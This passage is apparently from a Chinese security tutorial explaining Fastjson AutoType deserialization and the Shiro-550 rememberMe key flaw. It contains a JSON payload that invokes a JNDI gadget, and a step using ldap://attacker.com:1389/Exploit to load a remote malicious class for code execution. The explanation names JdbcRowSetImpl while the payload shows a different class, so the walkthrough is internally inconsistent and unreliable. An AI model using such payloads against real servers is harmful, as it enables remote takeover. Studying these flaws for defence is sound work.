### 2.1.1漏洞原理

Fastjson 的反序列化漏洞的核心在于 `AutoType`**机制**，攻击者利用该特性构造恶意 JSON 数据，触发 Java 类的危险方法。

​

`AutoType`是 Fastjson 提供的一个功能，允许在 JSON 字符串中通过 `@type`字段指定要反序列化的目标类。举一个简单的例子：

```
{
    "@type": "com.example.User",
    "name": "张三",
    "age": 25
}
```

Fastjson 在解析这段 JSON 时，会尝试：

1. 根据 `@type`指定的类名（`com.example.User`）加载对应的 Java 类。
2. 调用该类的 `setter`方法（如 `setName()`、`setAge()`）填充属性值。

那么我们就可以构造如下攻击链

```
{
  "@type": "org.apache.shiro.jndi.JndiObjectFactory",
  "resourceName": "ldap://127.0.0.1:1389/Exploit",
}
```

1. Fastjson 解析 JSON，实例化 `JdbcRowSetImpl`。
2. 调用 `setDataSourceName("ldap://attacker.com:1389/Exploit")`。
3. LDAP 服务器返回一个恶意类，Fastjson 加载并执行，导致 **远程代码执行（RCE）**。

## 2.5shiro反序列化

### 2.5.1漏洞原理

Shiro-550（CVE-2016-4437） 是 Apache Shiro 框架中的一个高危反序列化漏洞，其核心成因在于 `rememberMe`功能的默认加密密钥被硬编码在源码中，导致攻击者可轻易获取该密钥。

当用户启用 `rememberMe`功能时，Shiro 会对用户身份信息进行序列化、AES 加密及 Base64 编码，并存储于 Cookie 中。由于默认密钥固定，攻击者可构造恶意的序列化数据，经加密编码后伪造 `rememberMe`Cookie。服务器在解析该 Cookie 时，会执行反序列化操作，从而触发任意代码执行，最终可能导致服务器被完全控制。
